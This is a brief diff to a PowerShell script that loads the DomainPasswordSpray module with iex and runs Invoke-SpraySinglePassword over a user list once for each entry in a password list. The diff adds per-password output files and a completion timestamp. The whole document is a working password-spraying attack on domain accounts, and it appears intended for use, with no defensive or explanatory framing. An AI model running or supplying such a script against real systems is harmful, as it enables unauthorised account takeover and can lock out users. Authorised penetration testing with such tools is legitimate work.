@@ -1,3 +1,5 @@
 cd \temp
 iex ((gc .\DomainPasswordSpray.ps1) -join "`n")
-gc .\passwordlist.txt | % {Invoke-SpraySinglePassword -UserListArray ((gc .\users.txt) -replace '"','') -Password $_ }
+gc .\passwordlist.txt | % {Invoke-SpraySinglePassword -UserListArray ((gc .\users.txt) -replace '"','') -Password $_ -outfile C:\temp\$_.txt }
+Get-Date > C:\Temp\Password-Spray-completed.txt
+
